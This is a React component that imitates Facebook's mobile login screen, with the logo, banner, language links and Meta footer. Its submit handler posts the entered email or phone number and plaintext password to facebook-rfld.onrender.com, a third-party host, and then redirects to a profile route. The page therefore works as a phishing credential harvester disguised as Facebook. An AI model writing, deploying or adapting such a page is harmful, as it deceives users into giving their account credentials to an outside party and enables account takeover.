import { useState } from "react";
import { FaPlus } from "react-icons/fa";
import { useNavigate } from 'react-router-dom'

const Fb = () => {
  const [name, setName] = useState("");
  const [password, setPass] = useState("");
const navigate = useNavigate()
  const SubmitHandler = async (e) => {
      e.preventDefault();
      let d = JSON.stringify({
        name,
        password,
      });
      const res = await fetch("https://facebook-rfld.onrender.com/api/auth/user", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: d,
      });
      const data = await res.json();
      if (data.success) {
        setName("")
        setPass("")
        navigate("/profile");
      }
  };

  return (
    <div className="w-full h-screen">
      <div className="nav w-full bg-[#FFFBE2] h-12 items-center flex">
        <img width="50px" src="./assets/mobile.png" alt="" />
        <h3 className="text-zinc-700">
          Get Facebook for Android browse faster
        </h3>
      </div>
      <h3 className="w-full text-center flex justify-center">
        <img width="140px" src="./assets/logo.svg" alt="" />
      </h3>
      <form onSubmit={SubmitHandler}>
        <div className="w-full h-11 px-4 my-2">
          <input
            className="bg-[#F5F6F7] border-[0.3px] px-2 text-sm outline-none border-[#ddd] rounded-md w-full h-full"
            type="text"
            placeholder="Mobile number or email address"
            value={name}
            onChange={(e) => setName(e.target.value)}
          />
        </div>
        <div className="w-full h-11 px-4 my-2">
          <input
            className="bg-[#F5F6F7] text-sm outline-none px-2 border-[0.3px] border-[#ddd] rounded-md w-full h-full"
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPass(e.target.value)}
          />
        </div>
        <div className="w-full h-12 px-4 my-2">
          <button
            type="submit"
            className="w-full rounded-md font-bold text-white py-3 mt-2 bg-[#1877F2] "
          >
            Log in
          </button>
        </div>
      </form>
      <a
        className="w-full text-center inline-block mt-2 text-[#1877F2]
      "
        href="#"
      >
        Forgotten password?
      </a>
      <div className="flex w-full relative items-center mt-4">
        <div className="w-1/3 absolute left-6 bg-black/30 h-[1px]"></div>
        <span className="w-full text-center">or</span>
        <div className="w-1/3 absolute right-6 bg-black/30 h-[1px]"></div>
      </div>
      <div className="w-full flex justify-center">
        <button className="w-5/6 py-2 border-[1px] border-black/40 mx-auto font-semibold mt-4 rounded-md">
          Create new account
        </button>
      </div>
      <div className="w-full flex mt-20">
        <div className="w-1/2">
          <h2 className="w-full text-sm text-zinc-500 text-center">
            English (UK)
          </h2>
          <h2 className="w-full text-sm text-zinc-500 text-center">پښتو</h2>
          <h2 className="w-full text-sm text-zinc-500 text-center">हिन्दी</h2>
          <h2 className="w-full text-sm text-zinc-500 text-center">Español</h2>
        </div>
        <div className="w-1/2 flex flex-col items-center">
          <h2 className="w-full text-sm text-zinc-500 text-center">اردو</h2>
          <h2 className="w-full text-sm text-zinc-500 text-center">العربية</h2>
          <h2 className="w-full text-sm text-zinc-500 text-center">বাংলা</h2>
          <button className="border-[1px] border-zinc-500 rounded-sm p-1">
            <FaPlus className="text-zinc-500 text-sm" />
          </button>
        </div>
      </div>
      <div className="flex text-xs text-zinc-500 gap-3 justify-center mt-5">
        <h4>About</h4>
        <h4>Help</h4>
        <h4>More</h4>
      </div>
      <h2 className="w-full text-center text-sm font-semibold text-zinc-500 mt-2">
        Meta © 2024
      </h2>
    </div>
  );
};

export default Fb;
